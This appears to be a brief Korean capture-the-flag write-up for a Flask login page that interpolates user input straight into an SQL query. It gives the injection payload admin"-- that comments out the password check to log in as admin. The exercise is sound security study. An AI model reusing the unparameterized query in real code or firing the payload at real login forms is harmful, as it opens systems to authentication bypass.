## 코드

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

## 풀이

query에 대해 필터링, 처리 없음
인증 절차도 id만 보기 때문에 그냥 주석처리 하면 됨

```sql
select * from users where userid="admin"--" and userpassword="{userpassword}"
```

입력값
admin"--
asdf